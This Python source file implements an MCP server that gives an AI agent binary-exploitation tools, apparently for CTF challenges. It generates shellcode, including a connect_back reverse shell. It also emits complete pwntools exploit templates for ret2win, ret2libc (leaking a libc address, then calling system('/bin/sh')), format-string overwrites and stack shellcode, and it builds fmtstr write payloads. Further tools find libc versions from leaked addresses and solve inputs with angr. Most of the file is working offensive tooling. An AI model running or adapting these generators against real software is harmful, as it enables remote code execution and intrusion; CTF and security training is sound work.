#!/usr/bin/env python3
"""CTF Pwn / Binary Exploitation MCP Server — triage, disassembly, ROP, pwntools."""

import json
import os
import re
import sys
import textwrap

sys.path.insert(0, os.path.dirname(__file__))
from fastmcp import FastMCP
from lib.subprocess_utils import parse_checksec, run_tool

mcp = FastMCP(
    "ctf-pwn",
    instructions=(
        "Binary exploitation (pwn) tools for CTF challenges. "
        "Start with pwn_triage for a comprehensive overview, then use "
        "pwn_pwntools_template, pwn_format_string, or pwn_libc_lookup (identify libc "
        "version from leaked addresses) as needed."
    ),
)


# ── pwn_triage ────────────────────────────────────────────────────────────

# Categorized dangerous functions for better triage output
DANGEROUS_FUNCS_OVERFLOW = {
    "gets",
    "scanf",
    "sprintf",
    "strcpy",
    "strcat",
    "vsprintf",
    "realpath",
    "getwd",
    "streadd",
    "strecpy",
    "strtrns",
    "wcscpy",
    "wcscat",
    "swprintf",
}
DANGEROUS_FUNCS_FORMAT = {
    "printf",
    "fprintf",
    "dprintf",
    "sprintf",
    "snprintf",
    "vprintf",
    "vfprintf",
    "vsprintf",
    "vsnprintf",
    "syslog",
    "vsyslog",
}
DANGEROUS_FUNCS_HEAP = {
    "malloc",
    "free",
    "realloc",
    "calloc",
}
DANGEROUS_FUNCS = (
    DANGEROUS_FUNCS_OVERFLOW | DANGEROUS_FUNCS_FORMAT | DANGEROUS_FUNCS_HEAP
)


def _pwn_triage_impl(path: str) -> str:
    """Internal implementation of pwn_triage (callable without MCP decorator)."""
    path = os.path.realpath(path)
    if not os.path.isfile(path):
        return json.dumps({"error": f"File not found: {path}"})

    result = {"path": path}

    r = run_tool(["file", "-b", path])
    result["file_type"] = r["stdout"].strip()

    r = run_tool(["checksec", "--file=" + path])
    output = r["stdout"] + r["stderr"]
    result["checksec"] = parse_checksec(output)

    r = run_tool(["rabin2", "-I", path])
    if r["returncode"] == 0:
        info = {}
        for line in r["stdout"].splitlines():
            if "~" in line:
                continue
            parts = line.strip().split(None, 1)
            if len(parts) == 2:
                info[parts[0]] = parts[1]
        result["arch"] = info.get("arch", "unknown")
        result["bits"] = info.get("bits", "unknown")
        result["endian"] = info.get("endian", "unknown")
        result["os"] = info.get("os", "unknown")
        result["bintype"] = info.get("bintype", "unknown")

    r = run_tool(["rabin2", "-i", "-j", path])
    if r["returncode"] == 0:
        try:
            imports_data = json.loads(r["stdout"])
            imports = [i.get("name", "") for i in imports_data.get("imports", [])]
            result["imports"] = imports
            dangerous = [f for f in imports if f in DANGEROUS_FUNCS]
            result["dangerous_functions"] = dangerous
            if dangerous:
                result["vuln_categories"] = {}
                overflow = [f for f in dangerous if f in DANGEROUS_FUNCS_OVERFLOW]
                fmt = [f for f in dangerous if f in DANGEROUS_FUNCS_FORMAT]
                heap = [f for f in dangerous if f in DANGEROUS_FUNCS_HEAP]
                if overflow:
                    result["vuln_categories"]["buffer_overflow"] = overflow
                if fmt:
                    result["vuln_categories"]["format_string"] = fmt
                if heap:
                    result["vuln_categories"]["heap"] = heap
        except json.JSONDecodeError:
            result["imports"] = []

    r = run_tool(["rabin2", "-E", "-j", path])
    if r["returncode"] == 0:
        try:
            exports_data = json.loads(r["stdout"])
            result["exports"] = [
                e.get("name", "") for e in exports_data.get("exports", [])
            ]
        except json.JSONDecodeError:
            result["exports"] = []

    r = run_tool(["rabin2", "-S", "-j", path])
    if r["returncode"] == 0:
        try:
            sections_data = json.loads(r["stdout"])
            result["sections"] = [
                {
                    "name": s.get("name", ""),
                    "size": s.get("size", 0),
                    "perm": s.get("perm", ""),
                }
                for s in sections_data.get("sections", [])
            ]
        except json.JSONDecodeError:
            result["sections"] = []

    r = run_tool(["rabin2", "-z", "-j", path])
    if r["returncode"] == 0:
        try:
            strings_data = json.loads(r["stdout"])
            all_strings = [s.get("string", "") for s in strings_data.get("strings", [])]
            interesting_patterns = re.compile(
                r"flag\{|ctf\{|password|secret|/bin/sh|/bin/bash|admin|login|key|token|shell",
                re.IGNORECASE,
            )
            result["strings_interesting"] = [
                s for s in all_strings if interesting_patterns.search(s)
            ]
            result["strings_total"] = len(all_strings)
        except json.JSONDecodeError:
            pass

    return json.dumps(result, indent=2)


@mcp.tool()
def pwn_triage(path: str) -> str:
    """Comprehensive one-shot binary analysis — runs file, checksec, rabin2 and returns structured JSON.

    Provides file type, security mitigations, interesting strings, imports/exports,
    sections, architecture, and flags dangerous functions.
    """
    return _pwn_triage_impl(path)


# ── pattern_offset ───────────────────────────────────────────────────────────


@mcp.tool()
def pwn_pattern_offset(
    action: str = "create", length: int = 200, value: str = ""
) -> str:
    """Generate cyclic patterns or find offset from a crash value using pwntools.

    Args:
        action: "create" to generate a pattern, "find" to find offset of a value
        length: Pattern length for creation (default 200)
        value: The crash value to find offset for (hex like "0x41414141" or ASCII)
    """
    from pwn import cyclic, cyclic_find

    if action == "create":
        pattern = cyclic(length)
        return json.dumps(
            {
                "pattern": pattern.decode("latin-1"),
                "pattern_hex": pattern.hex(),
                "length": length,
            },
            indent=2,
        )
    elif action == "find":
        if value.startswith("0x"):
            # Hex value — convert to bytes
            val_int = int(value, 16)
            val_bytes = val_int.to_bytes(4 if val_int < 0x100000000 else 8, "little")
        else:
            val_bytes = value.encode()

        try:
            offset = cyclic_find(val_bytes)
            if offset == -1:
                return json.dumps(
                    {"error": f"Value {value} not found in cyclic pattern"}, indent=2
                )
            return json.dumps({"value": value, "offset": offset}, indent=2)
        except Exception as e:
            return json.dumps({"error": str(e)}, indent=2)

    return json.dumps({"error": f"Unknown action: {action}"}, indent=2)


# ── shellcode_generate ───────────────────────────────────────────────────────


@mcp.tool()
def pwn_shellcode_generate(
    arch: str = "amd64",
    os_name: str = "linux",
    payload: str = "sh",
) -> str:
    """Generate shellcode using pwntools shellcraft.

    Args:
        arch: Architecture — "amd64", "i386", "arm", "aarch64", "mips"
        os_name: OS — "linux", "freebsd"
        payload: Payload type — "sh" (spawn shell), "cat_flag" (cat flag.txt),
                 "connect_back(host,port)" (reverse shell), "execve(path,args)"
    """
    import pwn

    with pwn.context.local(arch=arch, os=os_name):
        try:
            if payload == "sh":
                sc = pwn.shellcraft.sh()
            elif payload == "cat_flag":
                sc = pwn.shellcraft.cat("flag.txt")
            elif payload.startswith("connect_back("):
                args = payload[len("connect_back(") : -1].split(",")
                host = args[0].strip().strip("'\"")
                port = int(args[1].strip())
                sc = pwn.shellcraft.connect(host, port) + pwn.shellcraft.dupsh()
            elif payload.startswith("execve("):
                args = payload[len("execve(") : -1]
                sc = pwn.shellcraft.execve(args)
            else:
                ALLOWED_SHELLCRAFT = {
                    "sh",
                    "cat",
                    "cat2",
                    "nop",
                    "infloop",
                    "trap",
                    "exit",
                    "pushstr",
                    "echo",
                    "write",
                    "read",
                    "open",
                    "close",
                }
                if payload not in ALLOWED_SHELLCRAFT:
                    return json.dumps(
                        {
                            "error": f"Unknown payload type: {payload}. Supported: sh, cat_flag, connect_back(host,port), execve(path), {', '.join(sorted(ALLOWED_SHELLCRAFT))}"
                        },
                        indent=2,
                    )
                sc = getattr(pwn.shellcraft, payload)()

            assembled = pwn.asm(sc)
            return json.dumps(
                {
                    "arch": arch,
                    "os": os_name,
                    "payload": payload,
                    "assembly": sc,
                    "shellcode_hex": assembled.hex(),
                    "shellcode_escaped": "".join(f"\\x{b:02x}" for b in assembled),
                    "length": len(assembled),
                },
                indent=2,
            )
        except Exception as e:
            return json.dumps({"error": str(e)}, indent=2)


# ── pwntools_template ───────────────────────────────────────────────────────


@mcp.tool()
def pwn_pwntools_template(
    path: str,
    remote: str = "",
    technique: str = "ret2win",
    win_function: str = "",
) -> str:
    """Generate a complete pwntools exploit script skeleton from binary analysis.

    Args:
        path: Path to the binary to exploit
        remote: Remote target as "host:port" (optional)
        technique: Exploit technique — "ret2win", "ret2libc", "rop_chain", "format_string", "shellcode"
        win_function: Name of the win/flag function for ret2win (auto-detected if empty)
    """
    path = os.path.realpath(path)

    # Get binary info
    triage = json.loads(_pwn_triage_impl(path))
    arch = triage.get("arch", "x86")
    bits = triage.get("bits", "64")

    remote_parts = remote.split(":") if remote else []
    remote_host = remote_parts[0] if len(remote_parts) == 2 else ""
    remote_port = remote_parts[1] if len(remote_parts) == 2 else ""

    # Auto-detect win function
    if not win_function and technique == "ret2win":
        exports = triage.get("exports", [])
        for candidate in ["win", "flag", "shell", "get_flag", "print_flag", "secret"]:
            if candidate in exports:
                win_function = candidate
                break
        if not win_function:
            win_function = "win  # TODO: replace with actual function name"

    context_arch = "amd64" if "64" in str(bits) else "i386"

    if technique == "ret2win":
        template = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            from pwn import *

            context.arch = '{context_arch}'
            context.log_level = 'info'

            elf = ELF('{path}')
            {"rop = ROP(elf)" if "64" in str(bits) else ""}

            {"# Remote connection" if remote else "# Local process"}
            {"io = remote('" + remote_host + "', " + remote_port + ")" if remote else "io = process(elf.path)"}

            # Find the win function address
            win_addr = elf.symbols['{win_function}']
            log.info(f'Win function at: {{hex(win_addr)}}')

            # Build payload
            offset = 0  # TODO: find with pattern_offset tool
            payload = b'A' * offset
            {"payload += p64(rop.find_gadget(['ret'])[0])  # stack alignment" if "64" in str(bits) else ""}
            payload += {"p64" if "64" in str(bits) else "p32"}(win_addr)

            io.sendline(payload)
            io.interactive()
        """)

    elif technique == "ret2libc":
        template = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            from pwn import *

            context.arch = '{context_arch}'
            context.log_level = 'info'

            elf = ELF('{path}')
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # TODO: adjust path
            rop = ROP(elf)

            {"io = remote('" + remote_host + "', " + remote_port + ")" if remote else "io = process(elf.path)"}

            # Stage 1: Leak libc address
            offset = 0  # TODO: find with pattern_offset tool
            {"pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]" if "64" in str(bits) else ""}
            ret = rop.find_gadget(['ret'])[0]

            payload = b'A' * offset
            payload += p64(pop_rdi)
            payload += p64(elf.got['puts'])
            payload += p64(elf.plt['puts'])
            payload += p64(elf.symbols['main'])  # return to main

            io.sendline(payload)
            io.recvuntil(b'\\n')  # TODO: adjust
            leak = u64(io.recvline().strip().ljust(8, b'\\x00'))
            log.info(f'Leaked puts: {{hex(leak)}}')

            libc.address = leak - libc.symbols['puts']
            log.info(f'Libc base: {{hex(libc.address)}}')

            # Stage 2: system("/bin/sh")
            payload = b'A' * offset
            payload += p64(ret)  # stack alignment
            payload += p64(pop_rdi)
            payload += p64(next(libc.search(b'/bin/sh\\x00')))
            payload += p64(libc.symbols['system'])

            io.sendline(payload)
            io.interactive()
        """)

    elif technique == "format_string":
        template = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            from pwn import *

            context.arch = '{context_arch}'
            context.log_level = 'info'

            elf = ELF('{path}')

            {"io = remote('" + remote_host + "', " + remote_port + ")" if remote else "io = process(elf.path)"}

            # Step 1: Find format string offset
            # Send %p.%p.%p... to find where your input appears on stack
            # io.sendline(b'%p.' * 20)

            # Step 2: Use fmtstr_payload to write
            offset = 0  # TODO: find the stack offset where your input starts
            target_addr = elf.got['exit']  # TODO: what to overwrite
            target_value = elf.symbols['win']  # TODO: what to write

            payload = fmtstr_payload(offset, {{target_addr: target_value}})
            io.sendline(payload)
            io.interactive()
        """)

    elif technique == "shellcode":
        template = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            from pwn import *

            context.arch = '{context_arch}'
            context.log_level = 'info'

            elf = ELF('{path}')

            {"io = remote('" + remote_host + "', " + remote_port + ")" if remote else "io = process(elf.path)"}

            # Generate shellcode
            shellcode = asm(shellcraft.sh())
            log.info(f'Shellcode length: {{len(shellcode)}}')

            # Build payload
            offset = 0  # TODO: find with pattern_offset tool
            buf_addr = 0x0  # TODO: find writable address (use pwn_triage)

            payload = shellcode
            payload += b'A' * (offset - len(shellcode))
            payload += {"p64" if "64" in str(bits) else "p32"}(buf_addr)

            io.sendline(payload)
            io.interactive()
        """)

    else:
        template = f"# Unknown technique: {technique}"

    return json.dumps(
        {
            "technique": technique,
            "binary": path,
            "arch": context_arch,
            "remote": remote or "local",
            "script": template,
            "binary_info": {
                "checksec": triage.get("checksec", {}),
                "dangerous_functions": triage.get("dangerous_functions", []),
                "imports": triage.get("imports", [])[:20],
            },
        },
        indent=2,
    )


# ── angr_analyze ─────────────────────────────────────────────────────────────


@mcp.tool()
def pwn_angr_analyze(
    path: str,
    mode: str = "auto",
    target_addr: str = "",
    avoid_addrs: str = "",
    find_string: str = "",
    stdin_length: int = 64,
) -> str:
    """Use angr for automatic symbolic execution and constraint solving on binaries.

    Best for: simple stack-based challenges, finding inputs that reach a target,
    solving password checks, and exploring reachable paths.

    Args:
        path: Path to the binary
        mode: Analysis mode:
            - "auto": Try to find a path that prints flag-like output
            - "find_addr": Find input reaching target_addr (hex)
            - "find_string": Find input that causes find_string to appear in stdout
            - "explore": Explore execution paths and report reachable functions
        target_addr: Target address for find_addr mode (hex, e.g. "0x401234")
        avoid_addrs: Comma-separated addresses to avoid (hex)
        find_string: String to search for in stdout for find_string/auto modes
        stdin_length: Maximum stdin input length for symbolic buffer (default 64)
    """
    path = os.path.realpath(path)
    if not os.path.isfile(path):
        return json.dumps({"error": f"File not found: {path}"})

    try:
        import angr
        import claripy
    except ImportError:
        return json.dumps(
            {"error": "angr not available — install with: pip install angr"}
        )

    try:
        proj = angr.Project(path, auto_load_libs=False)
    except Exception as e:
        return json.dumps({"error": f"Failed to load binary: {e}"})

    result = {
        "binary": path,
        "arch": proj.arch.name,
        "mode": mode,
    }

    avoid_list = []
    if avoid_addrs:
        avoid_list = [int(a.strip(), 16) for a in avoid_addrs.split(",") if a.strip()]

    try:
        # Create symbolic stdin
        sym_input = claripy.BVS("stdin", stdin_length * 8)
        state = proj.factory.entry_state(
            stdin=angr.SimFileStream(name="stdin", content=sym_input),
        )

        simgr = proj.factory.simulation_manager(state)

        if mode == "find_addr" and target_addr:
            target = int(target_addr, 16)
            simgr.explore(find=target, avoid=avoid_list)

            if simgr.found:
                found_state = simgr.found[0]
                solution = found_state.solver.eval(sym_input, cast_to=bytes)
                # Trim trailing nulls
                solution = solution.rstrip(b"\x00")
                stdout_output = found_state.posix.dumps(1)

                result["status"] = "found"
                result["input_hex"] = solution.hex()
                result["input_ascii"] = solution.decode("latin-1", errors="replace")
                result["input_repr"] = repr(solution)
                result["stdout"] = stdout_output.decode("latin-1", errors="replace")[
                    :2000
                ]
            else:
                result["status"] = "not_found"
                result["deadended"] = len(simgr.deadended)
                result["active"] = len(simgr.active)

        elif mode == "find_string" and find_string:

            def check_stdout(s):
                out = s.posix.dumps(1)
                return find_string.encode() in out

            simgr.explore(find=check_stdout, avoid=avoid_list)

            if simgr.found:
                found_state = simgr.found[0]
                solution = found_state.solver.eval(sym_input, cast_to=bytes)
                solution = solution.rstrip(b"\x00")
                stdout_output = found_state.posix.dumps(1)

                result["status"] = "found"
                result["input_hex"] = solution.hex()
                result["input_ascii"] = solution.decode("latin-1", errors="replace")
                result["input_repr"] = repr(solution)
                result["stdout"] = stdout_output.decode("latin-1", errors="replace")[
                    :2000
                ]
                result["matched_string"] = find_string
            else:
                result["status"] = "not_found"
                result["deadended"] = len(simgr.deadended)

        elif mode == "auto":
            # Auto mode: look for flag-like output patterns
            flag_patterns = [b"flag{", b"CTF{", b"ctf{", b"FLAG{"]
            if find_string:
                flag_patterns.insert(0, find_string.encode())

            def check_flag(s):
                out = s.posix.dumps(1)
                return any(pat in out for pat in flag_patterns)

            def check_fail(s):
                out = s.posix.dumps(1)
                fail_patterns = [b"Wrong", b"Incorrect", b"denied", b"FAIL", b"Nope"]
                return any(pat in out for pat in fail_patterns)

            simgr.explore(
                find=check_flag,
                avoid=check_fail if not avoid_list else avoid_list,
            )

            if simgr.found:
                found_state = simgr.found[0]
                solution = found_state.solver.eval(sym_input, cast_to=bytes)
                solution = solution.rstrip(b"\x00")
                stdout_output = found_state.posix.dumps(1)

                result["status"] = "found"
                result["input_hex"] = solution.hex()
                result["input_ascii"] = solution.decode("latin-1", errors="replace")
                result["input_repr"] = repr(solution)
                result["stdout"] = stdout_output.decode("latin-1", errors="replace")[
                    :2000
                ]
            else:
                result["status"] = "not_found"
                result["deadended"] = len(simgr.deadended)
                result["active"] = len(simgr.active)
                result["note"] = (
                    "Auto mode did not find flag-like output. "
                    "Try find_addr with a specific target or increase stdin_length."
                )

        elif mode == "explore":
            # Just explore and report what we find
            simgr.run(until=lambda sm: len(sm.active) == 0 or len(sm.deadended) > 50)

            result["status"] = "explored"
            result["deadended_count"] = len(simgr.deadended)
            result["active_count"] = len(simgr.active)

            # Collect unique stdout outputs
            outputs = set()
            for s in simgr.deadended[:20]:
                out = s.posix.dumps(1).decode("latin-1", errors="replace")[:500]
                if out.strip():
                    outputs.add(out)
            result["unique_outputs"] = list(outputs)[:10]

        else:
            result["error"] = (
                f"Unknown mode: {mode}. Use auto, find_addr, find_string, or explore."
            )

    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)

    return json.dumps(result, indent=2)


# ── libc_lookup ───────────────────────────────────────────────────────────────


@mcp.tool()
def pwn_libc_lookup(
    symbols: str,
) -> str:
    """Identify a remote libc version from leaked function addresses via libc.rip.

    Args:
        symbols: JSON string mapping symbol names to leaked hex addresses,
                 e.g. '{"puts": "0x7f1234567890", "printf": "0x7f1234567abc"}'

    The tool computes page offsets (last 12 bits) automatically and queries
    the libc.rip database. Returns matching libc versions with key offsets
    (system, /bin/sh, __free_hook) and the computed libc base address.
    """
    import requests

    try:
        sym_dict = json.loads(symbols)
    except json.JSONDecodeError as e:
        return json.dumps({"error": f"Invalid JSON symbols: {e}"}, indent=2)

    if not sym_dict:
        return json.dumps({"error": "Empty symbols dict"}, indent=2)

    # Compute last 12 bits (page offset) for each symbol
    api_symbols = {}
    for name, addr in sym_dict.items():
        addr_int = int(addr, 16) if isinstance(addr, str) else addr
        api_symbols[name] = hex(addr_int & 0xFFF)

    try:
        resp = requests.post(
            "https://libc.rip/api/find",
            json={"symbols": api_symbols},
            timeout=15,
        )
        resp.raise_for_status()
        matches = resp.json()
    except Exception as e:
        return json.dumps({"error": f"libc.rip API failed: {e}"}, indent=2)

    results = []
    for match in matches[:10]:
        entry = {
            "id": match.get("id", ""),
            "buildid": match.get("buildid", ""),
            "download_url": match.get("download_url", ""),
            "symbols": match.get("symbols", {}),
        }
        # Extract key offsets
        syms = match.get("symbols", {})
        for key in ("system", "str_bin_sh", "__free_hook", "__malloc_hook"):
            if key in syms:
                entry[f"{key}_offset"] = syms[key]
        results.append(entry)

    # Compute libc base from first match
    if results and results[0].get("symbols"):
        first_syms = results[0]["symbols"]
        for name, addr in sym_dict.items():
            if name in first_syms:
                addr_int = int(addr, 16) if isinstance(addr, str) else addr
                sym_offset = (
                    int(first_syms[name], 16)
                    if isinstance(first_syms[name], str)
                    else first_syms[name]
                )
                results[0]["computed_base"] = hex(addr_int - sym_offset)
                break

    return json.dumps(
        {"query": sym_dict, "match_count": len(results), "matches": results}, indent=2
    )


# ── format_string ─────────────────────────────────────────────────────────────


@mcp.tool()
def pwn_format_string(
    mode: str = "find_offset",
    offset: int = 0,
    writes: str = "",
    arch: str = "amd64",
    padding: int = 0,
) -> str:
    """Generate format string exploit payloads using pwntools.

    Args:
        mode: "find_offset" (probe payload), "write" (arbitrary write), "info" (reference)
        offset: Stack offset where format string input appears (for write mode)
        writes: JSON dict of {hex_addr: hex_value} for write mode,
                e.g. '{"0x404020": "0x401234"}'
        arch: Architecture — "amd64" or "i386" (default "amd64")
        padding: Bytes already written before format string (numbwritten for pwntools)
    """
    import pwn

    with pwn.context.local(arch=arch):
        if mode == "find_offset":
            probe = ".".join(f"%{i}$p" for i in range(1, 30))
            return json.dumps(
                {
                    "mode": "find_offset",
                    "probe_payload": probe,
                    "instructions": (
                        "Send this payload as input. Look for '0x25702e25' (hex of '%p.%') "
                        "or your input bytes in the output. The position N where your input "
                        "appears is the format string offset. Use that as the 'offset' "
                        "parameter in write mode."
                    ),
                },
                indent=2,
            )

        elif mode == "write":
            if not writes:
                return json.dumps(
                    {"error": "write mode requires 'writes' parameter"}, indent=2
                )
            try:
                write_dict = {
                    int(addr, 16): int(val, 16)
                    for addr, val in json.loads(writes).items()
                }
            except (json.JSONDecodeError, ValueError) as e:
                return json.dumps({"error": f"Invalid writes JSON: {e}"}, indent=2)

            try:
                payload = pwn.fmtstr_payload(offset, write_dict, numbwritten=padding)
            except Exception as e:
                return json.dumps({"error": f"fmtstr_payload failed: {e}"}, indent=2)

            return json.dumps(
                {
                    "mode": "write",
                    "offset": offset,
                    "writes": writes,
                    "payload_hex": payload.hex(),
                    "payload_length": len(payload),
                },
                indent=2,
            )

        elif mode == "info":
            return json.dumps(
                {
                    "mode": "info",
                    "format_specifiers": {
                        "%p": "Print stack value as pointer (leak addresses)",
                        "%s": "Print string at address on stack (arbitrary read)",
                        "%n": "Write count of chars printed to address on stack",
                        "%N$p": "Direct parameter access: print Nth stack value",
                        "%N$n": "Write to address at Nth stack position",
                        "%hhn": "Write single byte (mod 256)",
                        "%hn": "Write 2 bytes (mod 65536)",
                    },
                    "exploit_steps": [
                        "1. Find offset: send '%p.%p.%p...' to find where input appears on stack",
                        "2. Leak addresses: use %N$p to read specific stack positions (libc, canary, etc.)",
                        "3. Arbitrary read: place address on stack, use %N$s to read string there",
                        "4. Arbitrary write: use pwn_format_string(mode='write', offset=N, writes='{\"addr\": \"val\"}')",
                    ],
                },
                indent=2,
            )

    return json.dumps({"error": f"Unknown mode: {mode}"}, indent=2)


if __name__ == "__main__":
    mcp.run(transport="stdio")
